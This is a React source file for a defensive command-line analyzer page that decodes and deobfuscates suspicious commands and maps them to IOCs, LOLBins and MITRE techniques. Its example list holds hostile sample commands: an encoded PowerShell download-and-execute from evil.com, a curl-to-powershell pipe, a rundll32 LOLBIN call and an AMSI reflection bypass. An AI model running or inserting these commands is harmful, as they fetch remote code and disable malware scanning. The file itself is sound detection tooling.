import { useState, useEffect } from "react";
import Header from "@/components/Header";
import PageHeader from "@/components/PageHeader";
import ShellcodeView from "@/components/ShellcodeView";
import api from "@/lib/api";
import {
  Terminal, Play, Loader2, AlertTriangle, ChevronDown, ChevronUp,
  Copy, ChevronRight, Zap,
} from "lucide-react";

const EXAMPLES = [
  {
    label: "PowerShell -Enc",
    cmd: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AeAAuAHAAcwAxACIAKQA=',
  },
  {
    label: "certutil decode (file — no inline decode)",
    cmd: "certutil -decode input.b64 output.exe",
  },
  {
    label: "curl → powershell pipeline",
    cmd: "curl http://evil.com/payload.ps1 | powershell",
  },
  {
    label: "PS FromBase64String inner",
    cmd: `powershell -c "[Convert]::FromBase64String('aGVsbG8gd29ybGQ=')"`,
  },
  {
    label: "rundll32 mshtml LOLBIN",
    cmd: `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();`,
  },
  {
    label: "PS variable+concat obfuscation",
    cmd: `$a="I";$b="EX";$c=$a+$b; & $c whoami`,
  },
  {
    label: "AMSI reflection bypass",
    cmd: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
  },
];

export default function CommandAnalyzerPage() {
  const [input, setInput] = useState("");
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState("");
  const [report, setReport] = useState(null);
  const [plannerHint, setPlannerHint] = useState(null);

  // Debounced real-time input analyzer — same infra as Workspace
  useEffect(() => {
    if (!input || input.length < 20) { setPlannerHint(null); return; }
    const t = setTimeout(async () => {
      try {
        const r = await api.post("/planner/advise", { input });
        const hints = r.data?.hints || [];
        setPlannerHint(hints[0] || null);
      } catch (_) { setPlannerHint(null); }
    }, 400);
    return () => clearTimeout(t);
  }, [input]);

  const run = async (forceSpan) => {
    if (!input.trim()) { setErr("Provide a command to analyze"); return; }
    setBusy(true); setErr("");
    try {
      const r = await api.post("/analyze/command", {
        input,
        force_decode_span: forceSpan || null,
      });
      setReport(r.data);
    } catch (e) {
      setErr(e?.response?.data?.detail || e.message);
    } finally {
      setBusy(false);
    }
  };

  return (
    <div style={{ minHeight: "100vh", background: "var(--bg)", color: "var(--text)" }}>
      <Header />
      <div style={{ maxWidth: 1360, margin: "0 auto", padding: 20, display: "grid", gap: 18 }}>

        <PageHeader
          testId="analyzer-hero"
          eyebrow="Intelligent Command-Line Analyzer"
          title="Semantic parse. Then decode."
          subtitle="Understands the interpreter, tokenises the pipeline, isolates the actual encoded region — and only decodes what should be decoded."
          icon={Terminal}
          tone="accent"
        />

        <div className="card">
          <div className="card-head" style={{ padding: "10px 14px" }}>
            <div className="mono" style={{
              fontSize: 11, color: "var(--accent)", letterSpacing: "0.2em",
            }}>▸ COMMAND</div>
          </div>
          <div style={{ padding: 14, display: "grid", gap: 10 }}>
            <textarea
              data-testid="command-input"
              rows={6}
              value={input}
              onChange={(e) => setInput(e.target.value)}
              placeholder="Paste a full command line (PowerShell, CMD, Bash, Python, JS, mshta, rundll32, certutil, msiexec …)"
              className="mono"
              style={{
                width: "100%", padding: 10, background: "var(--panel-2, rgba(0,0,0,0.35))",
                border: "1px solid var(--line)", borderRadius: 2,
                fontSize: 12.5, color: "var(--text)", resize: "vertical",
              }}
            />
            <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
              <button
                data-testid="analyze-btn"
                className="nvx-btn primary"
                onClick={() => run()} disabled={busy}
              >
                {busy ? <Loader2 size={12} className="spin" /> : <Play size={12} />} ANALYZE
              </button>
              <button
                data-testid="clear-btn"
                className="nvx-btn ghost"
                onClick={() => { setInput(""); setReport(null); setErr(""); }}
              >
                CLEAR
              </button>
            </div>
            <div className="mono" style={{
              fontSize: 10, color: "var(--text-dim)", letterSpacing: "0.14em",
            }}>
              LOAD EXAMPLE:
            </div>
            <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
              {EXAMPLES.map((ex, i) => (
                <button
                  key={i}
                  data-testid={`example-${i}`}
                  onClick={() => setInput(ex.cmd)}
                  className="nvx-btn sm ghost"
                  style={{ fontSize: 10 }}
                >
                  ◆ {ex.label}
                </button>
              ))}
            </div>
            {err && (
              <div className="mono" style={{ fontSize: 11, color: "var(--high)" }}
                   data-testid="analyze-error">
                <AlertTriangle size={12} /> {err}
              </div>
            )}
          </div>
        </div>

        {report && !report.error && (
          <>
            {/* Parsed Structure */}
            <Section title="PARSED STRUCTURE" testid="parsed-structure-section">
              <div style={{ display: "grid", gridTemplateColumns: "auto 1fr", rowGap: 6, columnGap: 14 }}>
                <Label>Interpreter</Label>
                <Value data-testid="ps-interpreter">
                  <code>{report.parsed_structure.interpreter}</code>
                </Value>
                <Label>Executable</Label>
                <Value data-testid="ps-executable"><code>{report.parsed_structure.executable}</code></Value>
                <Label>Switches</Label>
                <Value data-testid="ps-switches">
                  {(report.parsed_structure.switches || []).map((s, i) => (
                    <span key={i} className="badge" style={{ marginRight: 4 }}>{s}</span>
                  ))}
                  {!report.parsed_structure.switches?.length && <em style={{ color: "var(--text-dim)" }}>none</em>}
                </Value>
                <Label>Arguments</Label>
                <Value data-testid="ps-arguments">
                  {(report.parsed_structure.arguments || []).map((a, i) => (
                    <code key={i} style={{
                      marginRight: 6, padding: "1px 6px", fontSize: 11,
                      background: "var(--panel-2, rgba(0,0,0,0.3))", borderRadius: 2,
                      wordBreak: "break-all",
                    }}>
                      {a.length > 60 ? a.slice(0, 60) + "…" : a}
                    </code>
                  ))}
                  {!report.parsed_structure.arguments?.length && <em style={{ color: "var(--text-dim)" }}>none</em>}
                </Value>
                {report.parsed_structure.pipeline_segments?.length > 1 && (
                  <>
                    <Label>Pipeline</Label>
                    <Value data-testid="ps-pipeline">
                      {report.parsed_structure.pipeline_segments.map((seg, i, arr) => (
                        <span key={i} style={{ display: "inline-flex", alignItems: "center", gap: 4 }}>
                          <code style={{ padding: "1px 6px", background: "var(--panel-2, rgba(0,0,0,0.3))", fontSize: 11 }}>
                            {seg}
                          </code>
                          {i < arr.length - 1 && (
                            <ChevronRight size={12} style={{ color: "var(--text-dim)" }} />
                          )}
                        </span>
                      ))}
                    </Value>
                  </>
                )}
              </div>
            </Section>

            {/* Identified Payloads */}
            <Section title={`IDENTIFIED PAYLOADS · ${report.identified_payloads.length}`}
                     testid="payloads-section"
                     accent={report.needs_choice ? "var(--warn)" : "var(--accent)"}>
              {report.needs_choice && (
                <div className="mono" style={{
                  padding: 10, marginBottom: 10, border: "1px solid var(--warn)",
                  background: "var(--warn)15", fontSize: 12, color: "var(--warn)",
                }} data-testid="needs-choice-banner">
                  <AlertTriangle size={12} /> {report.choice_reason}. Pick one below to decode:
                </div>
              )}
              {report.identified_payloads.length === 0 && (
                <div className="mono" style={{ fontSize: 12, color: "var(--text-dim)" }}
                     data-testid="no-payloads">
                  No inline encoded payload detected in this command. The behavior
                  panel below explains what the command does.
                </div>
              )}
              <div style={{ display: "grid", gap: 8 }}>
                {report.identified_payloads.map((p, i) => (
                  <div key={i} className="brut-border" style={{ padding: 10, background: "var(--inset)" }}
                       data-testid={`payload-${i}`}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 10, flexWrap: "wrap" }}>
                      <div style={{ display: "flex", gap: 6, alignItems: "center", flexWrap: "wrap" }}>
                        <span className="badge" style={{ background: "var(--accent)22", color: "var(--accent)" }}>
                          {p.encoding}
                        </span>
                        <span className="mono" style={{ fontSize: 11, color: "var(--text)" }}>{p.role}</span>
                        {p.auto_decoded && (
                          <span className="badge" data-testid={`payload-${i}-auto`}
                                style={{ background: "var(--good)22", color: "var(--good)", border: "1px solid var(--good)" }}>
                            ⚡ AUTO-DECODED
                          </span>
                        )}
                      </div>
                      <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
                        <ConfidenceBar value={p.confidence} />
                        {report.needs_choice && !p.auto_decoded && (
                          <button
                            data-testid={`payload-${i}-choose`}
                            className="nvx-btn sm primary"
                            onClick={() => run(p.span)}
                            disabled={busy}
                          >
                            <Zap size={11} /> DECODE THIS
                          </button>
                        )}
                      </div>
                    </div>
                    <div className="mono" style={{
                      marginTop: 6, fontSize: 10.5, color: "var(--text-dim)", fontStyle: "italic",
                    }}>{p.reason}</div>
                    <pre className="mono" style={{
                      margin: "8px 0 0", padding: 8, fontSize: 11, color: "var(--good)",
                      background: "var(--panel-2, rgba(0,0,0,0.35))", border: "1px solid var(--line)",
                      borderRadius: 2, maxHeight: 90, overflow: "auto",
                      whiteSpace: "pre-wrap", wordBreak: "break-all",
                    }}>{p.span.length > 400 ? p.span.slice(0, 400) + "…" : p.span}</pre>
                  </div>
                ))}
              </div>
            </Section>

            {/* Decode Chains */}
            {report.decode_chains.length > 0 && (
              <Section title="DECODE CHAINS" testid="decode-chains-section" accent="var(--good)">
                {report.decode_chains.map((d, i) => (
                  <div key={i} className="brut-border" style={{ padding: 10, marginBottom: 10, background: "var(--inset)" }}
                       data-testid={`decode-chain-${i}`}>
                    <div className="mono" style={{ fontSize: 11, color: "var(--text-dim)", marginBottom: 6 }}>
                      <b style={{ color: "var(--accent)" }}>{d.role}</b>
                    </div>
                    {d.chains.filter(c => (c.steps || []).length).slice(0, 3).map((ch, ci) => (
                      <div key={ci} className="mono" style={{ fontSize: 11, marginBottom: 4 }}>
                        <span style={{ color: "var(--text-dim)" }}>[{ch.engine}]</span>{" "}
                        {ch.steps.map((s, si) => (
                          <span key={si}>
                            <span style={{ color: "var(--accent)" }}>{s.op}</span>
                            {si < ch.steps.length - 1 && <span style={{ color: "var(--text-dim)" }}> → </span>}
                          </span>
                        ))}
                        {ch.score !== undefined && <span style={{ color: "var(--text-dim)" }}> · score={ch.score}</span>}
                      </div>
                    ))}
                    <div className="mono" style={{ fontSize: 11, color: "var(--text-dim)", marginTop: 8 }}>
                      final decoded:
                    </div>
                    <pre className="mono" data-testid={`decode-chain-${i}-final`}
                         style={{
                           margin: "4px 0 0", padding: 8, fontSize: 11.5, color: "var(--text)",
                           background: "var(--panel-2, rgba(0,0,0,0.35))",
                           border: "1px solid var(--good)44", borderRadius: 2,
                           whiteSpace: "pre-wrap", wordBreak: "break-all",
                           maxHeight: 240, overflow: "auto",
                         }}>{d.final_output || "(no decodable output)"}</pre>
                    {d.is_shellcode && (
                      <div style={{ marginTop: 10 }} data-testid={`decode-chain-${i}-shellcode`}>
                        <div className="mono" style={{ fontSize: 10.5, color: "var(--high)", letterSpacing: "0.14em", marginBottom: 6 }}>
                          ⚠ Binary detected — routing to shellcode analyzer
                        </div>
                        <ShellcodeView output={d.final_output} />
                      </div>
                    )}
                  </div>
                ))}
              </Section>
            )}

            {/* Inline reconstruction */}
            <Section title="RECONSTRUCTED COMMAND · inline decoded" testid="inline-section">
              <pre className="mono" data-testid="final-inline"
                   style={{
                     margin: 0, padding: 10, fontSize: 12, color: "var(--text)",
                     background: "var(--panel-2, rgba(0,0,0,0.35))", border: "1px solid var(--line)",
                     borderRadius: 2, whiteSpace: "pre-wrap", wordBreak: "break-all",
                   }}>{report.final_decoded_inline}</pre>
              <button
                className="nvx-btn sm ghost"
                style={{ marginTop: 6 }}
                onClick={() => navigator.clipboard.writeText(report.final_decoded_inline)}
                data-testid="copy-inline"
              >
                <Copy size={11} /> COPY
              </button>
            </Section>

            {/* Execution flow */}
            {report.execution_flow?.length > 0 && (
              <Section title={`EXECUTION FLOW · ${report.execution_flow.length} signal${report.execution_flow.length === 1 ? "" : "s"}`}
                       testid="execflow-section" accent="var(--warn)">
                <div style={{ display: "grid", gap: 6 }}>
                  {report.execution_flow.map((e, i) => {
                    const kindColor = {
                      executor: "var(--high)", downloader: "var(--accent)",
                      persistence: "var(--warn)", "file-decode": "var(--text-dim)",
                      "code-exec-obj": "var(--high)",
                    }[e.kind] || "var(--text)";
                    return (
                      <div key={i} className="brut-border" style={{
                        padding: 8, background: "var(--inset)",
                        borderLeft: `3px solid ${kindColor}`,
                      }} data-testid={`execflow-${i}`}>
                        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 6 }}>
                          <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
                            <span className="badge" style={{ background: `${kindColor}22`, color: kindColor, border: `1px solid ${kindColor}44`, textTransform: "uppercase" }}>
                              {e.kind}
                            </span>
                            <span className="mono" style={{ fontSize: 12, color: "var(--text)", fontWeight: 700 }}>
                              {e.label}
                            </span>
                          </div>
                          <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
                            <span className="badge" style={{ background: "var(--warn)22", color: "var(--warn)", border: "1px solid var(--warn)44" }}>
                              MITRE {e.mitre_id}
                            </span>
                            <span className="badge" style={{ background: `${kindColor}22`, color: kindColor }}>
                              {e.severity}
                            </span>
                          </div>
                        </div>
                        {e.evidence && (
                          <pre className="mono" style={{
                            margin: "5px 0 0", padding: 5, fontSize: 10.5,
                            background: "var(--panel-2, rgba(0,0,0,0.35))", border: "1px solid var(--line)",
                            borderRadius: 2, color: "var(--text-dim)",
                            whiteSpace: "pre-wrap", wordBreak: "break-all",
                          }}>{e.evidence}</pre>
                        )}
                      </div>
                    );
                  })}
                </div>
              </Section>
            )}

            {/* PowerShell AST deobfuscation */}
            {report.ast_deobfuscation?.applied && (
              <Section title={`POWERSHELL AST DEOBFUSCATION · ${(report.ast_deobfuscation.transformations || []).length} transforms`}
                       testid="ast-section" accent="var(--good)">
                {Object.keys(report.ast_deobfuscation.bindings || {}).length > 0 && (
                  <div style={{ marginBottom: 10 }}>
                    <div className="mono" style={{ fontSize: 10, color: "var(--text-dim)", letterSpacing: "0.15em", marginBottom: 4 }}>
                      VARIABLE BINDINGS
                    </div>
                    <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
                      {Object.entries(report.ast_deobfuscation.bindings).map(([k, v], i) => (
                        <code key={i} className="mono" data-testid={`ast-binding-${i}`}
                              style={{
                                fontSize: 11, padding: "2px 6px", color: "var(--good)",
                                border: "1px solid var(--good)44", background: "var(--good)0F",
                                borderRadius: 2, wordBreak: "break-all",
                              }}>
                          {k} = {JSON.stringify(v).slice(0, 60)}
                        </code>
                      ))}
                    </div>
                  </div>
                )}
                <div className="mono" style={{ fontSize: 10, color: "var(--text-dim)", letterSpacing: "0.15em", marginBottom: 4 }}>
                  TRANSFORMATIONS APPLIED
                </div>
                <ul style={{ margin: 0, paddingLeft: 18, display: "grid", gap: 3 }}>
                  {report.ast_deobfuscation.transformations.map((t, i) => (
                    <li key={i} className="mono" style={{ fontSize: 11, color: "var(--text)" }}
                        data-testid={`ast-transform-${i}`}>
                      <b style={{ color: "var(--accent)" }}>{t.kind}</b>{t.detail ? ` · ${t.detail}` : ""}
                    </li>
                  ))}
                </ul>
                <div className="mono" style={{ fontSize: 10, color: "var(--text-dim)", letterSpacing: "0.15em", marginTop: 10, marginBottom: 4 }}>
                  DEOBFUSCATED OUTPUT
                </div>
                <pre className="mono" data-testid="ast-final"
                     style={{
                       margin: 0, padding: 8, fontSize: 11.5, color: "var(--text)",
                       background: "var(--panel-2, rgba(0,0,0,0.35))",
                       border: "1px solid var(--good)44", borderRadius: 2,
                       whiteSpace: "pre-wrap", wordBreak: "break-all",
                       maxHeight: 240, overflow: "auto",
                     }}>{report.ast_deobfuscation.final}</pre>
              </Section>
            )}

            {/* AMSI / Defense-evasion */}
            {report.amsi_bypass?.detected && (
              <Section title={`AMSI / DEFENSE-EVASION · ${report.amsi_bypass.severity?.toUpperCase()}`}
                       testid="amsi-section" accent="var(--high)">
                <div style={{ marginBottom: 10 }}>
                  <span className="badge" data-testid="amsi-severity-badge"
                        style={{
                          background: "var(--high)22", color: "var(--high)",
                          border: "1px solid var(--high)",
                        }}>
                    ⚠ AMSI BYPASS · {report.amsi_bypass.severity}
                  </span>
                  <span className="mono" style={{ fontSize: 11, color: "var(--text-dim)", marginLeft: 10 }}>
                    {report.amsi_bypass.amsi_related_count} AMSI · {report.amsi_bypass.etw_related_count} ETW
                  </span>
                </div>
                <div style={{ display: "grid", gap: 6 }}>
                  {report.amsi_bypass.techniques.map((t, i) => (
                    <div key={i} className="brut-border" style={{
                      padding: 8, background: "var(--inset)",
                    }} data-testid={`amsi-technique-${i}`}>
                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 6 }}>
                        <div className="mono" style={{ fontSize: 12, color: "var(--text)" }}>
                          <b style={{ color: "var(--high)" }}>{t.name}</b>
                        </div>
                        <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
                          <span className="badge" style={{ background: "var(--warn)22", color: "var(--warn)", border: "1px solid var(--warn)44" }}>
                            MITRE {t.mitre_id}
                          </span>
                          <span className="badge">{Math.round(t.confidence * 100)}%</span>
                        </div>
                      </div>
                      <div className="mono" style={{ fontSize: 10, color: "var(--text-dim)", marginTop: 4 }}>
                        [{t.pattern_id}] · {t.category}
                      </div>
                      {t.evidence && (
                        <pre className="mono" style={{
                          margin: "6px 0 0", padding: 6, fontSize: 10.5,
                          background: "var(--panel-2, rgba(0,0,0,0.35))",
                          border: "1px solid var(--high)44", borderRadius: 2,
                          color: "var(--high)", whiteSpace: "pre-wrap", wordBreak: "break-all",
                          maxHeight: 60, overflow: "auto",
                        }}>{t.evidence}</pre>
                      )}
                    </div>
                  ))}
                </div>
              </Section>
            )}

            {/* IOCs + LOLBins + MITRE */}
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
              <Section title="IOCs" testid="iocs-section">
                <IocList label="URLs" items={report.iocs.urls} color="var(--accent)" testid="ioc-urls" />
                <IocList label="IPs" items={report.iocs.ips} color="var(--accent)" testid="ioc-ips" />
                <IocList label="Domains" items={report.iocs.domains} color="var(--accent)" testid="ioc-domains" />
                <IocList label="File paths" items={report.iocs.file_paths} color="var(--text)" testid="ioc-file-paths" />
                <IocList label="Reg keys" items={report.iocs.regkeys} color="var(--text)" testid="ioc-regkeys" />
                {["md5", "sha1", "sha256"].map(h => (
                  <IocList key={h} label={h.toUpperCase()}
                           items={report.iocs.hashes?.[h]}
                           color="var(--text-dim)" testid={`ioc-hash-${h}`} />
                ))}
              </Section>
              <div style={{ display: "grid", gap: 12 }}>
                <Section title="LOLBINS" testid="lolbins-section" accent="var(--high)">
                  {report.lolbins.length === 0
                    ? <em style={{ color: "var(--text-dim)" }}>none detected</em>
                    : report.lolbins.map((l, i) => (
                        <span key={i} className="badge" data-testid={`lolbin-${i}`}
                              style={{ background: "var(--high)22", color: "var(--high)", border: "1px solid var(--high)", marginRight: 4 }}>
                          ⚠ {l.name} · {l.role}
                        </span>
                    ))}
                </Section>
                <Section title="MITRE ATT&CK" testid="mitre-section" accent="var(--warn)">
                  {report.mitre.length === 0
                    ? <em style={{ color: "var(--text-dim)" }}>no techniques mapped</em>
                    : report.mitre.map((m, i) => (
                        <div key={i} className="mono" style={{ fontSize: 11.5, marginBottom: 3 }}
                             data-testid={`mitre-${i}`}>
                          <b style={{ color: "var(--warn)" }}>{m.id}</b> · {m.name}
                        </div>
                    ))}
                </Section>
              </div>
            </div>

            {/* Behavior summary */}
            <Section title="BEHAVIOR SUMMARY" testid="behavior-section" accent="var(--accent)">
              <div style={{ marginBottom: 8, display: "flex", gap: 4, flexWrap: "wrap" }}>
                {report.behaviors.map((b, i) => (
                  <span key={i} className="badge" data-testid={`behavior-${i}`}
                        style={{ background: "var(--accent)22", color: "var(--accent)", border: "1px solid var(--accent)44" }}>
                    {b.tag}
                  </span>
                ))}
                {!report.behaviors.length && (
                  <em style={{ color: "var(--text-dim)", fontSize: 11 }}>no notable behavior</em>
                )}
              </div>
              <div className="mono" data-testid="behavior-summary-text"
                   style={{ fontSize: 12, lineHeight: 1.55, color: "var(--text)" }}>
                {report.behavior_summary}
              </div>
            </Section>
          </>
        )}
      </div>
    </div>
  );
}


function Section({ title, children, testid, accent = "var(--accent)" }) {
  const [open, setOpen] = useState(true);
  return (
    <div className="card" data-testid={testid}>
      <div className="card-head" style={{
        padding: "10px 14px", cursor: "pointer",
        display: "flex", alignItems: "center", justifyContent: "space-between",
      }} onClick={() => setOpen(v => !v)}>
        <div className="mono" style={{ fontSize: 11, color: accent, letterSpacing: "0.22em" }}>
          ▸ {title}
        </div>
        {open ? <ChevronUp size={14} color="var(--text-dim)" /> : <ChevronDown size={14} color="var(--text-dim)" />}
      </div>
      {open && <div style={{ padding: 14 }}>{children}</div>}
    </div>
  );
}


function Label({ children }) {
  return <span className="mono" style={{
    fontSize: 10, color: "var(--text-dim)", letterSpacing: "0.18em",
    textTransform: "uppercase", alignSelf: "start", paddingTop: 3,
  }}>{children}</span>;
}


function Value({ children, ...rest }) {
  return <div {...rest} style={{ fontFamily: "var(--font-mono, monospace)", fontSize: 12 }}>{children}</div>;
}


function ConfidenceBar({ value }) {
  const pct = Math.round((value || 0) * 100);
  const color = value >= 0.80 ? "var(--good)" : value >= 0.60 ? "var(--warn)" : "var(--text-dim)";
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 6 }} data-testid="confidence-bar">
      <div style={{ width: 80, height: 6, background: "var(--panel-2, #222)", borderRadius: 3, overflow: "hidden" }}>
        <div style={{ width: `${pct}%`, height: "100%", background: color, transition: "width 200ms ease" }} />
      </div>
      <span className="mono" style={{ fontSize: 10, color, minWidth: 34, textAlign: "right" }}>
        {pct}%
      </span>
    </div>
  );
}


function IocList({ label, items, color, testid }) {
  if (!items || items.length === 0) return null;
  return (
    <div data-testid={testid} style={{ marginBottom: 8 }}>
      <div className="mono" style={{ fontSize: 10, color: "var(--text-dim)", marginBottom: 3, letterSpacing: "0.15em" }}>
        {label} · {items.length}
      </div>
      <div style={{ display: "flex", flexWrap: "wrap", gap: 4 }}>
        {items.map((v, i) => (
          <code key={i} className="mono" style={{
            fontSize: 11, padding: "2px 6px", color, border: `1px solid ${color}44`,
            background: `${color}0F`, borderRadius: 2, wordBreak: "break-all",
          }}>
            {v}
          </code>
        ))}
      </div>
    </div>
  );
}
